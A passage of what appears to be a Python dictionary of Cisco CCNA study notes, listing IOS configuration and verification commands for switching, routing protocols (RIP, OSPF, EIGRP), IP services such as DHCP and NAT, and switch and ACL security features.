                    "code": """! --- SPANNING TREE PROTOCOL ---
! STP Mode
Switch(config)# spanning-tree mode pvst
Switch(config)# spanning-tree mode rapid-pvst
Switch(config)# spanning-tree mode mst

! Root Bridge
Switch(config)# spanning-tree vlan 1 root primary
Switch(config)# spanning-tree vlan 10 root secondary
Switch(config)# spanning-tree vlan 1 priority 24576

! Manual Priority
Switch(config)# spanning-tree vlan 10 priority 4096

! Port Configuration
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# spanning-tree port-priority 64
Switch(config-if)# spanning-tree cost 100000

! PortFast
Switch(config-if)# spanning-tree portfast
Switch(config)# spanning-tree portfast default

! STP Timers
Switch(config)# spanning-tree vlan 1 hello-time 2
Switch(config)# spanning-tree vlan 1 forward-time 15
Switch(config)# spanning-tree vlan 1 max-age 20

! MST Configuration
Switch(config)# spanning-tree mst configuration
Switch(config-mst)# instance 1 vlan 1-10
Switch(config-mst)# instance 2 vlan 11-20
Switch(config-mst)# name CCNA_REGION
Switch(config-mst)# revision 1
Switch(config)# spanning-tree mst 1 root primary""",
                    "verification": """Switch# show spanning-tree
Switch# show spanning-tree vlan 10
Switch# show spanning-tree root
Switch# show spanning-tree bridge
Switch# show spanning-tree summary
Switch# show spanning-tree interface gigabitethernet 0/1
Switch# show spanning-tree mst configuration
Switch# debug spanning-tree events
Switch# debug spanning-tree pvst+
Switch# show spanning-tree inconsistentports""",
                    "example": "Root Bridge: Core/Distribution\nPortFast = End devices only!\nTimers: Hello 2s, Max Age 20s, Forward Delay 15s",
                    "notes": ""
                },
                
                "05. EtherChannel (PAgP & LACP)": {
                    "code": """! --- ETHERCHANNEL ---
! L2 EtherChannel
Switch(config)# interface range gigabitethernet 0/1-2
Switch(config-if-range)# switchport mode trunk
Switch(config-if-range)# channel-group 1 mode active      ! LACP
Switch(config-if-range)# channel-group 1 mode desirable   ! PAgP
Switch(config-if-range)# channel-group 1 mode on          ! Static

! L3 EtherChannel
Switch(config)# interface range gigabitethernet 0/3-4
Switch(config-if-range)# no switchport
Switch(config-if-range)# channel-group 2 mode active

! Port-Channel Interface
Switch(config)# interface port-channel 1
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan 10,20

! L3 Port-Channel
Switch(config)# interface port-channel 2
Switch(config-if)# no switchport
Switch(config-if)# ip address 192.168.10.1 255.255.255.0

! Load Balancing
Switch(config)# port-channel load-balance src-dst-ip

! LACP Advanced
Switch(config)# lacp system-priority 32000
Switch(config)# interface port-channel 1
Switch(config-if)# lacp max-bundle 4
Switch(config-if)# port-channel min-links 2""",
                    "verification": """Switch# show etherchannel summary
Switch# show etherchannel 1 port-channel
Switch# show etherchannel load-balance
Switch# show interfaces port-channel 1
Switch# show lacp neighbor
Switch# show lacp counters
Switch# show pagp neighbor
Switch# debug etherchannel

! EtherChannel Troubleshooting
Switch# show etherchannel detail
Switch# show lacp internal
Switch# show pagp internal""",
                    "example": "Max 8 active ports per channel.\nLACP: active/active or active/passive\nPAgP: desirable/desirable or desirable/auto",
                    "notes": ""
                },
                
                # ============ INTER-VLAN ROUTING & ROUTER-ON-A-STICK ============
                "06. 🔄 INTER-VLAN Routing & Router-on-a-Stick (Complete)": {
                    "code": """! ============ INTER-VLAN ROUTING & ROUTER-ON-A-STICK ============
! 
! ===== ROUTER CONFIGURATION (Router-on-a-Stick) =====
!
! 1. Enable Trunking on Router Interface
R1(config)# interface gigabitethernet 0/0
R1(config-if)# no shutdown
R1(config-if)# no ip address
!
! 2. Create Subinterfaces for Each VLAN
R1(config)# interface gigabitethernet 0/0.10
R1(config-subif)# encapsulation dot1Q 10
R1(config-subif)# ip address 192.168.10.1 255.255.255.0
R1(config-subif)# no shutdown
!
R1(config)# interface gigabitethernet 0/0.20
R1(config-subif)# encapsulation dot1Q 20
R1(config-subif)# ip address 192.168.20.1 255.255.255.0
R1(config-subif)# no shutdown
!
R1(config)# interface gigabitethernet 0/0.30
R1(config-subif)# encapsulation dot1Q 30
R1(config-subif)# ip address 192.168.30.1 255.255.255.0
R1(config-subif)# no shutdown
!
! 3. Native VLAN Configuration (Optional)
R1(config)# interface gigabitethernet 0/0.99
R1(config-subif)# encapsulation dot1Q 99 native
R1(config-subif)# ip address 10.0.0.1 255.255.255.0
R1(config-subif)# no shutdown
!
! ===== SWITCH CONFIGURATION =====
!
! 1. Create VLANs
SW1(config)# vlan 10
SW1(config-vlan)# name DATA
SW1(config-vlan)# vlan 20
SW1(config-vlan)# name VOICE
SW1(config-vlan)# vlan 30
SW1(config-vlan)# name GUEST
SW1(config-vlan)# vlan 99
SW1(config-vlan)# name NATIVE
!
! 2. Configure Trunk Port to Router
SW1(config)# interface gigabitethernet 0/1
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
SW1(config-if)# switchport trunk native vlan 99
SW1(config-if)# switchport trunk allowed vlan 10,20,30,99
SW1(config-if)# no shutdown
!
! 3. Configure Access Ports
! VLAN 10 - Data
SW1(config)# interface range fastethernet 0/1-10
SW1(config-if-range)# switchport mode access
SW1(config-if-range)# switchport access vlan 10
!
! VLAN 20 - Voice
SW1(config)# interface range fastethernet 0/11-20
SW1(config-if-range)# switchport mode access
SW1(config-if-range)# switchport access vlan 20
!
! Voice VLAN with IP Phone
SW1(config)# interface fastethernet 0/21
SW1(config-if)# switchport mode access
SW1(config-if)# switchport access vlan 10
SW1(config-if)# switchport voice vlan 20
!
! VLAN 30 - Guest
SW1(config)# interface range fastethernet 0/22-24
SW1(config-if-range)# switchport mode access
SW1(config-if-range)# switchport access vlan 30
!
! 4. Enable PortFast on Access Ports
SW1(config)# interface range fastethernet 0/1-24
SW1(config-if-range)# spanning-tree portfast
!
! ===== STATIC ROUTES FOR INTER-VLAN (Multi-Router Setup) =====
!
! On Core Router (R1)
R1(config)# ip route 172.16.10.0 255.255.255.0 192.168.10.2
R1(config)# ip route 172.16.20.0 255.255.255.0 192.168.20.2
!
! On Distribution Router (R2)
R2(config)# ip route 192.168.10.0 255.255.255.0 192.168.10.1
R2(config)# ip route 192.168.20.0 255.255.255.0 192.168.20.1
R2(config)# ip route 192.168.30.0 255.255.255.0 192.168.30.1
!
! Default Route to Internet
R1(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.1
!
! ===== LAYER 3 SWITCH INTER-VLAN ROUTING =====
!
! Enable IP Routing on L3 Switch
SW-L3(config)# ip routing
!
! Create SVI (Switch Virtual Interface)
SW-L3(config)# interface vlan 10
SW-L3(config-if)# ip address 192.168.10.1 255.255.255.0
SW-L3(config-if)# no shutdown
!
SW-L3(config)# interface vlan 20
SW-L3(config-if)# ip address 192.168.20.1 255.255.255.0
SW-L3(config-if)# no shutdown
!
SW-L3(config)# interface vlan 30
SW-L3(config-if)# ip address 192.168.30.1 255.255.255.0
SW-L3(config-if)# no shutdown
!
! Configure Uplink Port as Routed Port
SW-L3(config)# interface gigabitethernet 0/1
SW-L3(config-if)# no switchport
SW-L3(config-if)# ip address 10.0.0.2 255.255.255.0
SW-L3(config-if)# no shutdown
!
! Static Route on L3 Switch
SW-L3(config)# ip route 0.0.0.0 0.0.0.0 10.0.0.1
!
! ===== DHCP FOR MULTIPLE VLANS =====
!
! DHCP Pools for Each VLAN
R1(config)# ip dhcp excluded-address 192.168.10.1 192.168.10.10
R1(config)# ip dhcp excluded-address 192.168.20.1 192.168.20.10
R1(config)# ip dhcp excluded-address 192.168.30.1 192.168.30.10
!
R1(config)# ip dhcp pool VLAN10_POOL
R1(dhcp-config)# network 192.168.10.0 255.255.255.0
R1(dhcp-config)# default-router 192.168.10.1
R1(dhcp-config)# dns-server 8.8.8.8
R1(dhcp-config)# domain-name data.cisco.lab
!
R1(config)# ip dhcp pool VLAN20_POOL
R1(dhcp-config)# network 192.168.20.0 255.255.255.0
R1(dhcp-config)# default-router 192.168.20.1
R1(dhcp-config)# dns-server 8.8.8.8
R1(dhcp-config)# domain-name voice.cisco.lab
!
R1(config)# ip dhcp pool VLAN30_POOL
R1(dhcp-config)# network 192.168.30.0 255.255.255.0
R1(dhcp-config)# default-router 192.168.30.1
R1(dhcp-config)# dns-server 8.8.8.8
!
! DHCP Relay (if DHCP Server is on different subnet)
SW1(config)# interface vlan 10
SW1(config-if)# ip helper-address 192.168.10.1
SW1(config)# interface vlan 20
SW1(config-if)# ip helper-address 192.168.20.1
SW1(config)# interface vlan 30
SW1(config-if)# ip helper-address 192.168.30.1""",
                    "verification": """! ============ INTER-VLAN VERIFICATION COMMANDS ============
!
! ===== ROUTER VERIFICATION =====
R1# show ip interface brief
R1# show interfaces trunk
R1# show vlans
R1# show ip route
R1# show ip route connected
R1# show ip route static
R1# show dot1q-tunnel
R1# show interfaces gigabitethernet 0/0
R1# show interfaces gigabitethernet 0/0.10
R1# show running-config interface gigabitethernet 0/0.10
!
! ===== SWITCH VERIFICATION =====
SW1# show vlan brief
SW1# show interfaces trunk
SW1# show interfaces gigabitethernet 0/1 switchport
SW1# show interfaces status
SW1# show mac address-table
SW1# show mac address-table vlan 10
SW1# show spanning-tree
SW1# show etherchannel summary
!
! ===== LAYER 3 SWITCH VERIFICATION =====
SW-L3# show ip route
SW-L3# show ip interface brief
SW-L3# show interfaces vlan 10
SW-L3# show ip arp
!
! ===== CONNECTIVITY TESTS =====
! Ping from Router to VLAN gateways
R1# ping 192.168.10.1
R1# ping 192.168.20.1
R1# ping 192.168.30.1
!
! Ping between VLANs (should work)
PC1> ping 192.168.20.2
PC2> ping 192.168.30.2
!
! Ping to default gateway
PC1> ping 192.168.10.1
PC1> traceroute 192.168.30.2
!
! ===== DHCP VERIFICATION =====
R1# show ip dhcp binding
R1# show ip dhcp pool
R1# show ip dhcp server statistics
!
! ===== DEBUG COMMANDS =====
R1# debug dot1q packets
R1# debug ip packet
SW1# debug spanning-tree events
!
! ===== CLEAR COMMANDS =====
R1# clear ip route *
SW1# clear mac address-table dynamic
R1# clear ip dhcp binding *""",
                    "example": """═══════════════════════════════════════════════════════════════
          INTER-VLAN ROUTING - CONFIGURATION EXAMPLE
═══════════════════════════════════════════════════════════════

📌 SCENARIO: Router-on-a-Stick with 3 VLANs

┌─────────────────────────────────────────────────────────────┐
│                      ROUTER (R1)                           │
│  Gi0/0.10: 192.168.10.1/24 (VLAN 10 - Data)              │
│  Gi0/0.20: 192.168.20.1/24 (VLAN 20 - Voice)             │
│  Gi0/0.30: 192.168.30.1/24 (VLAN 30 - Guest)             │
│  Gi0/0.99: 10.0.0.1/24 (VLAN 99 - Native)                │
└──────────────────────────┬──────────────────────────────────┘
                           │ Trunk 802.1Q
                           │ Allowed VLANs: 10,20,30,99
┌──────────────────────────┴──────────────────────────────────┐
│                      SWITCH (SW1)                          │
│  Gi0/1: Trunk to Router                                    │
│  Fa0/1-10: Access VLAN 10 (Data)                          │
│  Fa0/11-20: Access VLAN 20 (Voice)                        │
│  Fa0/21: Access VLAN 10 + Voice VLAN 20 (IP Phone)        │
│  Fa0/22-24: Access VLAN 30 (Guest)                        │
└─────────────────────────────────────────────────────────────┘

💡 KEY POINTS:
• Router subinterfaces = logical interfaces on physical port
• Encapsulation dot1Q = Tags packets with VLAN ID
• Native VLAN = Untagged traffic (VLAN 99)
• Switch trunk port = Carries multiple VLANs
• Access port = Single VLAN
• Voice VLAN = Separate VLAN for IP phones

✅ BEST PRACTICES:
1. Use different subnet for each VLAN
2. Native VLAN ≠ VLAN 1
3. Limit allowed VLANs on trunk
4. Enable PortFast on access ports
5. Use DHCP pools per VLAN
6. Test connectivity between VLANs""",
                    "notes": ""
                }
            },
            
            "🌐 Routing": {
                "01. Static & Default Routes (IPv4/IPv6)": {
                    "code": """! --- STATIC & DEFAULT ROUTES ---
! IPv4 Static Route - Next Hop
Router(config)# ip route 192.168.10.0 255.255.255.0 172.16.1.1

! IPv4 Static Route - Exit Interface
Router(config)# ip route 192.168.20.0 255.255.255.0 serial 0/0/0

! IPv4 Static Route - Fully Specified
Router(config)# ip route 192.168.30.0 255.255.255.0 gigabitethernet 0/0 172.16.2.1

! Floating Static Route (Backup)
Router(config)# ip route 192.168.40.0 255.255.255.0 172.16.3.1 200

! Permanent Static Route
Router(config)# ip route 192.168.50.0 255.255.255.0 172.16.4.1 permanent

! IPv4 Default Route (Quad-Zero)
Router(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.1
Router(config)# ip route 0.0.0.0 0.0.0.0 serial 0/0/0

! IPv6 Static Route
Router(config)# ipv6 route 2001:db8:1:2::/64 2001:db8:1:1::2
Router(config)# ipv6 route 2001:db8:1:3::/64 gigabitethernet 0/0

! IPv6 Default Route
Router(config)# ipv6 route ::/0 2001:db8:1:1::2
Router(config)# ipv6 route ::/0 serial 0/0/0

! IPv6 Floating Static Route
Router(config)# ipv6 route 2001:db8:2:2::/64 gigabitethernet 0/0 200

! Null0 Route (Discard Traffic)
Router(config)# ip route 10.0.0.0 255.0.0.0 null0
Router(config)# ipv6 route 2001:db8::/32 null0""",
                    "verification": """Router# show ip route static
Router# show ip route 192.168.10.0
Router# show ip route 0.0.0.0
Router# show ip static route
Router# show ipv6 route static
Router# show ipv6 route ::/0
Router# ping 192.168.20.1
Router# traceroute 2001:db8:1:2::1""",
                    "example": "S* 0.0.0.0/0 [1/0] via 203.0.113.1\nS 192.168.10.0/24 [200/0] via 172.16.1.1 (Floating)",
                    "notes": ""
                },
                
                # ==================== RIPv2 COMPLETE CONFIGURATION ====================
                "02. 🔄 RIPv2 Routing (Complete with Authentication)": {
                    "code": """! ==================== RIPv2 COMPLETE CONFIGURATION ====================
! 1. Enable RIPv2
Router(config)# router rip
Router(config-router)# version 2

! 2. Disable Auto-Summary (Classless Routing)
Router(config-router)# no auto-summary

! 3. Advertise Networks (Classful Networks)
Router(config-router)# network 10.0.0.0
Router(config-router)# network 172.16.0.0
Router(config-router)# network 192.168.1.0
Router(config-router)# network 192.168.2.0

! 4. Passive Interface (Stop sending RIP updates on LAN)
Router(config-router)# passive-interface default
Router(config-router)# no passive-interface serial 0/0/0
Router(config-router)# no passive-interface gigabitethernet 0/1

! 5. Default Route Propagation
Router(config-router)# default-information originate

! 6. RIP Timers (Optional Tuning)
Router(config-router)# timers basic 30 180 180 240
! update: 30s, invalid: 180s, holddown: 180s, flush: 240s

! 7. Load Balancing
Router(config-router)# maximum-paths 4

! 8. Administrative Distance (Default is 120)
Router(config-router)# distance 120

! 9. Route Filtering (Distribute-List)
Router(config)# access-list 1 deny 192.168.3.0
Router(config)# access-list 1 permit any
Router(config-router)# distribute-list 1 in gigabitethernet 0/1

! 10. Metric Manipulation (Offset-List)
Router(config-router)# offset-list 0 in 2 gigabitethernet 0/0

! 11. Redistribution
Router(config-router)# redistribute static metric 2
Router(config-router)# redistribute connected metric 2

! 12. RIP Authentication (MD5)
Router(config)# key chain RIP-KEY
Router(config-keychain)# key 1
Router(config-keychain-key)# key-string Cisco123!
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ip rip authentication key-chain RIP-KEY
Router(config-if)# ip rip authentication mode md5

! 13. Unicast Update Neighbor (Non-Broadcast Networks)
Router(config-router)# neighbor 10.0.0.2

! 14. RIPng (IPv6)
Router(config)# ipv6 unicast-routing
Router(config)# ipv6 router rip RIPNG
Router(config-rtr)# redistribute static
Router(config-rtr)# default-information originate
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ipv6 rip RIPNG enable""",
                    "verification": """! ==================== RIPv2 VERIFICATION COMMANDS ====================
Router# show ip protocols
Router# show ip route
Router# show ip route rip
Router# show ip rip database
Router# show running-config | section router rip
Router# ping 192.168.2.1
Router# traceroute 192.168.2.1

! Debugging RIPv2
Router# debug ip rip
Router# debug ip rip events
Router# debug ip rip database

! RIPng Verification (IPv6)
Router# show ipv6 route
Router# show ipv6 rip database
Router# debug ipv6 rip

! Clear RIP Routes
Router# clear ip route *
Router# undebug all

! Authentication Verification
Router# show key chain""",
                    "example": "R 10.1.1.0/24 [120/2] via 10.0.0.2, Gi0/0\nAD: 120\nUpdate Timer: 30s\nHolddown Timer: 180s\n🔐 Authentication: MD5\n🌐 RIPng enabled for IPv6",
                    "notes": ""
                },
                
                "03. OSPFv2 (Single Area)": {
                    "code": """! --- OSPFv2 CONFIGURATION ---
! Enable OSPF Process
Router(config)# router ospf 1

! Router ID
Router(config-router)# router-id 1.1.1.1

! Network Statement Method
Router(config-router)# network 10.0.0.0 0.0.0.255 area 0
Router(config-router)# network 172.16.0.0 0.0.255.255 area 0

! Interface Method
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ip ospf 1 area 0

! Passive Interface
Router(config-router)# passive-interface default
Router(config-router)# no passive-interface gigabitethernet 0/1

! Cost Manipulation
Router(config-if)# ip ospf cost 100
Router(config-router)# auto-cost reference-bandwidth 10000

! Timers
Router(config-if)# ip ospf hello-interval 10
Router(config-if)# ip ospf dead-interval 40

! DR/BDR Election
Router(config-if)# ip ospf priority 255

! Default Route
Router(config-router)# default-information originate always

! Authentication (MD5)
Router(config-if)# ip ospf authentication message-digest
Router(config-if)# ip ospf message-digest-key 1 md5 CISCO

! Network Types
Router(config-if)# ip ospf network broadcast
Router(config-if)# ip ospf network point-to-point""",
                    "verification": """Router# show ip protocols
Router# show ip route ospf
Router# show ip ospf neighbor
Router# show ip ospf database
Router# clear ip ospf process
Router# debug ip ospf adj""",
                    "example": "O 10.1.1.0/24 [110/100] via 10.0.0.2, Gi0/0\nRouter ID: 1.1.1.1",
                    "notes": ""
                },
                
                "04. OSPFv3 (IPv6)": {
                    "code": """! --- OSPFv3 CONFIGURATION (IPv6) ---
! Enable IPv6 Routing
Router(config)# ipv6 unicast-routing

! Enable OSPFv3 Process
Router(config)# ipv6 router ospf 1
Router(config-rtr)# router-id 1.1.1.1
Router(config-rtr)# passive-interface default
Router(config-rtr)# no passive-interface gigabitethernet 0/0

! Interface Configuration
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ipv6 ospf 1 area 0
Router(config-if)# ipv6 ospf cost 100
Router(config-if)# ipv6 ospf hello-interval 10
Router(config-if)# ipv6 ospf dead-interval 40

! Default Route
Router(config-rtr)# default-information originate

! OSPFv3 for IPv4 (AF Mode)
Router(config)# router ospf 1
Router(config-router)# address-family ipv4 unicast
Router(config-router-af)# router-id 1.1.1.1
Router(config-router-af)# exit-address-family
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ospfv3 1 ipv4 area 0
Router(config-if)# ospfv3 1 ipv6 area 0""",
                    "verification": """Router# show ipv6 protocols
Router# show ipv6 route ospf
Router# show ipv6 ospf neighbor
Router# show ipv6 ospf interface
Router# debug ipv6 ospf adj""",
                    "example": "OSPFv3 uses link-local addresses\nRouter ID: 1.1.1.1",
                    "notes": ""
                },
                
                "05. EIGRP (Classic & Named Mode)": {
                    "code": """! --- EIGRP CONFIGURATION ---
! Classic EIGRP (IPv4)
Router(config)# router eigrp 100
Router(config-router)# no auto-summary
Router(config-router)# network 10.0.0.0 0.0.0.255
Router(config-router)# network 192.168.1.0
Router(config-router)# passive-interface default
Router(config-router)# no passive-interface serial 0/0/0
Router(config-router)# eigrp router-id 1.1.1.1

! EIGRP Stub
Router(config-router)# eigrp stub connected

! Bandwidth & Delay
Router(config)# interface serial 0/0/0
Router(config-if)# bandwidth 1544
Router(config-if)# delay 20000

! Load Balancing
Router(config-router)# maximum-paths 4
Router(config-router)# variance 2

! Authentication (MD5)
Router(config)# key chain EIGRP-KEY
Router(config-keychain)# key 1
Router(config-keychain-key)# key-string CISCO
Router(config)# interface serial 0/0/0
Router(config-if)# ip authentication mode eigrp 100 md5
Router(config-if)# ip authentication key-chain eigrp 100 EIGRP-KEY

! Named Mode EIGRP
Router(config)# router eigrp CCNP
Router(config-router)# address-family ipv4 unicast autonomous-system 100
Router(config-router-af)# af-interface default
Router(config-router-af-interface)# passive-interface
Router(config-router-af-interface)# exit-af-interface
Router(config-router-af)# network 10.0.0.0 0.0.0.255
Router(config-router-af)# eigrp router-id 1.1.1.1

! EIGRP for IPv6
Router(config)# ipv6 unicast-routing
Router(config)# ipv6 router eigrp 100
Router(config-rtr)# eigrp router-id 1.1.1.1
Router(config-rtr)# no shutdown
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ipv6 eigrp 100""",
                    "verification": """Router# show ip eigrp neighbors
Router# show ip eigrp topology
Router# show ip route eigrp
Router# debug eigrp packets
Router# show ipv6 eigrp neighbors""",
                    "example": "D 10.1.1.0/24 [90/2172416] via 10.0.0.2\nAD: Internal 90, External 170",
                    "notes": ""
                }
            },
            
            "⚙️ IP Services": {
                "01. DHCP Server & Relay": {
                    "code": """! --- DHCP SERVER & RELAY ---
! Enable DHCP Service
Router(config)# service dhcp

! Exclude Addresses
Router(config)# ip dhcp excluded-address 192.168.1.1
Router(config)# ip dhcp excluded-address 192.168.1.100 192.168.1.110

! Create DHCP Pool
Router(config)# ip dhcp pool LAN_POOL
Router(dhcp-config)# network 192.168.1.0 255.255.255.0
Router(dhcp-config)# default-router 192.168.1.1
Router(dhcp-config)# dns-server 8.8.8.8 8.8.4.4
Router(dhcp-config)# domain-name cisco.lab
Router(dhcp-config)# lease 7

! DHCP Options (Cisco IP Phones)
Router(dhcp-config)# option 150 ip 192.168.1.20
Router(dhcp-config)# option 66 ip 192.168.1.20

! DHCP Relay
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ip helper-address 10.0.0.5

! Static DHCP (Manual Binding)
Router(config)# ip dhcp pool STATIC_HOST
Router(dhcp-config)# host 192.168.1.50 255.255.255.0
Router(dhcp-config)# hardware-address aaaa.bbbb.cccc""",
                    "verification": """Router# show ip dhcp binding
Router# show ip dhcp pool
Router# show ip dhcp server statistics
Router# clear ip dhcp binding *
Router# debug ip dhcp server events""",
                    "example": "Client IP: 192.168.1.101\nLease: 7 days\nDNS: 8.8.8.8\nGateway: 192.168.1.1",
                    "notes": ""
                },
                
                "02. NAT & PAT (Complete)": {
                    "code": """! --- NAT & PAT CONFIGURATION ---
! Define Inside/Outside Interfaces
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ip nat inside
Router(config)# interface serial 0/0/0
Router(config-if)# ip nat outside

! Static NAT (One-to-One)
Router(config)# ip nat inside source static 192.168.1.10 203.0.113.10

! Dynamic NAT (Pool)
Router(config)# ip nat pool NAT-POOL 203.0.113.20 203.0.113.30 netmask 255.255.255.224
Router(config)# access-list 1 permit 192.168.1.0 0.0.0.255
Router(config)# ip nat inside source list 1 pool NAT-POOL

! PAT (Overload) - Interface Level
Router(config)# access-list 1 permit 192.168.0.0 0.0.255.255
Router(config)# ip nat inside source list 1 interface serial 0/0/0 overload

! Port Forwarding
Router(config)# ip nat inside source static tcp 192.168.1.12 3389 203.0.113.12 3389

! NAT Timeout
Router(config)# ip nat translation timeout 86400""",
                    "verification": """Router# show ip nat translations
Router# show ip nat statistics
Router# clear ip nat translation *
Router# debug ip nat""",
                    "example": "Dynamic NAT: Pool of public IPs (1:1)\nPAT: One public IP for all users (Many:1)",
                    "notes": ""
                },
                
                "03. NTP (Network Time Protocol)": {
                    "code": """! --- NTP CONFIGURATION ---
! Timezone
Router(config)# clock timezone EST -5

! NTP Client
Router(config)# ntp server 209.165.200.225
Router(config)# ntp server 209.165.200.226 prefer
Router(config)# ntp source loopback 0

! NTP Master (Server)
Router(config)# ntp master 5

! NTP Authentication
Router(config)# ntp authenticate
Router(config)# ntp authentication-key 1 md5 NTP-PASSWORD
Router(config)# ntp trusted-key 1
Router(config)# ntp server 192.168.1.1 key 1

! Manual Clock Setting
Router# clock set 14:30:00 15 March 2025
Router(config)# service timestamps log datetime msec""",
                    "verification": """Router# show ntp status
Router# show ntp associations
Router# show clock
Router# debug ntp all""",
                    "example": "Stratum 1: Atomic clock\nStratum 2: Sync to Stratum 1",
                    "notes": ""
                },
                
                "04. Syslog & Logging": {
                    "code": """! --- SYSLOG & LOGGING ---
! Enable Logging
Router(config)# logging on

! Remote Syslog Server
Router(config)# logging 192.168.1.100
Router(config)# logging host 192.168.1.101 transport udp port 514

! Syslog Severity Level
Router(config)# logging trap 6

! Logging to Buffer
Router(config)# logging buffered 8192

! Timestamps
Router(config)# service timestamps log datetime msec
Router(config)# service sequence-numbers

! Console Line Synchronous
Router(config)# line console 0
Router(config-line)# logging synchronous""",
                    "verification": """Router# show logging
Router# terminal monitor
Router# undebug all""",
                    "example": "Severity: 6=Informational\n*Mar 15 14:30:45.123: %SYS-5-CONFIG_I",
                    "notes": ""
                },
                
                "05. CDP & LLDP Operations": {
                    "code": """! --- CDP & LLDP OPERATIONS ---
! CDP Global
Router(config)# cdp run
Router(config)# cdp timer 30
Router(config)# cdp holdtime 120

! CDP Interface
Router(config)# interface gigabitethernet 0/0
Router(config-if)# cdp enable

! LLDP Global
Switch(config)# lldp run
Switch(config)# lldp timer 30
Switch(config)# lldp holdtime 120

! LLDP Interface
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# lldp transmit
Switch(config-if)# lldp receive""",
                    "verification": """Router# show cdp neighbors
Router# show cdp neighbors detail
Router# debug cdp packets

Switch# show lldp neighbors
Switch# show lldp neighbors detail
Switch# debug lldp packets""",
                    "example": "Device ID: R1\nLocal Intf: Gi0/0\nPlatform: ISR4321",
                    "notes": ""
                }
            },
            
            "🔐 Security": {
                "01. Switch Port Security": {
                    "code": """! --- SWITCH PORT SECURITY ---
! Enable Port Security
Switch(config)# interface fastethernet 0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2
Switch(config-if)# switchport port-security violation shutdown
Switch(config-if)# switchport port-security mac-address sticky

! Error-Disable Recovery
Switch(config)# errdisable recovery cause psecure-violation
Switch(config)# errdisable recovery interval 300

! Static MAC Address
Switch(config)# mac address-table static aaaa.bbbb.cccc vlan 1 interface fastethernet 0/1

! Clear MAC Table
Switch# clear mac address-table dynamic
Switch# clear mac address-table dynamic interface fastethernet 0/1""",
                    "verification": """Switch# show port-security
Switch# show port-security interface fastethernet 0/1
Switch# show port-security address
Switch# show mac address-table
Switch# show interfaces status err-disabled

! Recover from Err-Disable
Switch# clear errdisable interface fastethernet 0/1
Switch(config)# interface fastethernet 0/1
Switch(config-if)# shutdown
Switch(config-if)# no shutdown""",
                    "example": "Max MACs: 2\nViolation: Shutdown\nSticky MAC: Yes\nAging: 10 min inactivity",
                    "notes": ""
                },
                
                "02. STP Security": {
                    "code": """! --- STP SECURITY ---
! BPDU Guard
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# spanning-tree bpduguard enable
Switch(config)# spanning-tree portfast bpduguard default

! Root Guard
Switch(config)# interface gigabitethernet 0/2
Switch(config-if)# spanning-tree guard root

! Loop Guard
Switch(config)# interface gigabitethernet 0/3
Switch(config-if)# spanning-tree guard loop
Switch(config)# spanning-tree loopguard default

! UDLD
Switch(config)# udld enable
Switch(config)# interface gigabitethernet 0/4
Switch(config-if)# udld enable

! Storm-Control
Switch(config)# interface gigabitethernet 0/5
Switch(config-if)# storm-control broadcast level 50.00
Switch(config-if)# storm-control action shutdown

! Error-Disable Recovery for STP
Switch(config)# errdisable recovery cause bpduguard
Switch(config)# errdisable recovery cause rootguard
Switch(config)# errdisable recovery cause loopguard""",
                    "verification": """Switch# show spanning-tree summary
Switch# show spanning-tree interface gigabitethernet 0/1 detail
Switch# show spanning-tree inconsistentports
Switch# show udld neighbors
Switch# show storm-control
Switch# debug spanning-tree bpdu""",
                    "example": "BPDU Guard: Access ports\nRoot Guard: Uplinks\nLoop Guard: Alternate ports",
                    "notes": ""
                },
                
                "03. DHCP Snooping & DAI": {
                    "code": """! --- DHCP SNOOPING & DAI ---
! Enable DHCP Snooping
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 10,20

! Trusted Ports
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# ip dhcp snooping limit rate 100

! Verify MAC Address
Switch(config)# ip dhcp snooping verify mac-address

! Dynamic ARP Inspection (DAI)
Switch(config)# ip arp inspection vlan 10,20

! DAI Trusted Ports
Switch(config)# interface gigabitethernet 0/1
Switch(config-if)# ip arp inspection trust

! DAI Validation
Switch(config)# ip arp inspection validate src-mac dst-mac ip""",
                    "verification": """Switch# show ip dhcp snooping
Switch# show ip dhcp snooping binding
Switch# show ip source binding
Switch# show ip arp inspection
Switch# show ip arp inspection interfaces
Switch# debug ip dhcp snooping packet
Switch# debug ip arp inspection
Switch# clear ip dhcp snooping binding""",
                    "example": "Untrusted: Access ports\nTrusted: Uplinks, DHCP Server ports\nDAI validates ARP packets against DHCP snooping database",
                    "notes": ""
                },
                
                "04. IPv4 ACLs (Standard & Extended)": {
                    "code": """! --- IPv4 ACCESS CONTROL LISTS ---
! Standard ACL
Router(config)# access-list 1 permit 192.168.1.0 0.0.0.255
Router(config)# access-list 1 deny host 192.168.1.100
Router(config)# access-list 1 permit any

! Extended ACL
Router(config)# access-list 100 permit tcp 192.168.10.0 0.0.0.255 host 10.0.0.5 eq 80
Router(config)# access-list 100 permit tcp any host 10.0.0.5 eq 443 established
Router(config)# access-list 100 deny tcp any any eq 23 log
Router(config)# access-list 100 permit ip any any

! Named Extended ACL
Router(config)# ip access-list extended INTERNET_FILTER
Router(config-ext-nacl)# permit tcp 192.168.1.0 0.0.0.255 any eq 80
Router(config-ext-nacl)# permit tcp 192.168.1.0 0.0.0.255 any eq 443
Router(config-ext-nacl)# deny ip any any log

! Apply ACL to Interface
Router(config)# interface gigabitethernet 0/0
Router(config-if)# ip access-group INTERNET_FILTER in

! VTY Access Control
Router(config)# access-list 10 permit 192.168.1.0 0.0.0.255
Router(config)# line vty 0 15
Router(config-line)# access-class 10 in

! Time-Based ACL
Router(config)# time-range WORKING_HOURS
